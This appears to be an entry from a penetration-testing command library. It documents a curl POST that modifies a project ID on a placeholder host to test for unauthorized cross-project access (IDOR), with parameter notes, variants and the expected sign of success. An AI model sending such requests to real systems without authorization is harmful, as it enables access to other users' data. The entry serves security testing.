---
data: >-
  curl -X POST 'https://localize.example.com/pages/create_project/8h' -H
  'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  session=your_session_cookie' -d 'CSRFToken=your_csrf_token&group_name=test'
tags:
  - web-testing
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.740Z'
id: f2bbbef8-5373-4d04-9050-bff53b92abe7
verified: false
validated: true
submitted: true
---
# curl-modify-project-id

## Command

```bash
curl -X POST 'https://localize.example.com/pages/create_project/8h' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=your_session_cookie' \
  -d 'CSRFToken=your_csrf_token&group_name=test'
```

## Description

This command tests the endpoint with a modified project ID to check for cross-project access without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| URL path | Endpoint with target project ID (e.g., 8h) | Yes |
| `-H 'Content-Type: ...'` | Form encoding | Yes |
| `-H 'Cookie: ...'` | Session authentication | Yes |
| `-d 'CSRFToken=...'` | CSRF protection | Yes |
| `-d 'group_name=...'` | Benign payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://localize.example.com/pages/create_project/8h' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=abc123' -d 'CSRFToken=token123&group_name=test'
```

### Advanced Usage

With silent mode to suppress progress:

```bash
curl -s -X POST 'https://localize.example.com/pages/create_project/8h' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=abc123' -d 'CSRFToken=token123&group_name=test'
```

## Expected Output

HTTP 200 or 302 redirect, indicating acceptance of the foreign project ID without rejection.

## Related

- [[commands/curl-observe-create-group]]
- [[procedures/Modify-Request-to-Target-Arbitrary-Project]]
